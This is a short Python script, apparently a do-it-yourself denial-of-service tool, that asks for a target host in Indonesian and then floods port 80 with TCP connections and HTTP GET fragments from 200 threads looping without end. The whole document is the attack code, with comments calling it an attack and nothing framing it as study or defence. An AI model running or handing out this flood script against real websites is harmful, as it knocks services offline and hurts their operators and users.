import socket
import threading

# Set the target website and port
target = input(" [!] Masukkan target : ")  # Replace with the target website's URL
port = 80

# Function to launch the attack
def attack():
    while True:
        try:
            # Create a socket connection to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target, port))  # Send HTTP GET request
            print(f"Request sent to {target}")
        except:
            pass

# Number of threads for the attack
threads = 200

# Start attack with multiple threads
for i in range(threads):
    t = threading.Thread(target=attack)
    t.start()
